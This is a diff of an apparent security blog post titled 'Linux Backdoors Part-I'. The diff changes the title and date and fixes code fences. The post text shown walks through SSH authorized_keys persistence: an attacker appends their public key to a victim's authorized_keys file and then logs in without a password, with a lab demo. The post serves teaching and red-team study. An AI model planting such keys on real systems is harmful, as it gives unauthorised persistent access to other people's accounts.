@@ -1,6 +1,6 @@
 ---
-title : "Linux Backdoors"
-date : 2025-07-10
+title : "Linux Backdoors Part-I"
+date : 2025-08-17
 layout : post
 categories : [BACKDOOR]
 tags : [SSH, BACKDOOR, PERSISTENCE, LINUX]
@@ -45,9 +45,9 @@ The attacker compromises the system (via exploit, weak creds, phishing, etc.).
 ### ✅ Step 2: Key Setup  
 On their own machine, the attacker generates a key pair:  
 
-\`\`\`bash
+```bash
 ssh-keygen -t rsa -b 4096
-\`\`\`
+```
 
 This produces:  
 - Private key: `~/.ssh/id_rsa`  
@@ -56,18 +56,18 @@ This produces:
 ### ✅ Step 3: Plant the Backdoor  
 The attacker appends their public key to the victim’s authorized_keys file:  
 
-\`\`\`bash
+```bash
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /home/alice/.ssh/authorized_keys
-\`\`\`
+```
 
 Now Alice’s account trusts the attacker’s key.  
 
 ### ✅ Step 4: Silent Re-Entry  
 From then on, the attacker can connect like so:  
 
-\`\`\`bash
+```bash
 ssh -i ~/.ssh/id_rsa alice@victim_ip
-\`\`\`
+```
 
 No password prompt. Instant persistence.  
 
@@ -99,22 +99,22 @@ This makes it a favorite among attackers and red teamers alike.
 ## 🧪 Lab Example (Safe Demo)  
 
 **On attacker machine:**  
-\`\`\`bash
+```bash
 ssh-keygen -t rsa -b 2048
-\`\`\`
+```
 
 **On target machine:**  
-\`\`\`bash
+```bash
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
 echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
-\`\`\`
+```
 
 **Test the backdoor:**  
-\`\`\`bash
+```bash
 ssh -i ~/.ssh/id_rsa user@victim_ip
-\`\`\`
+```
 
 ➡️ Instant login without password.  
 
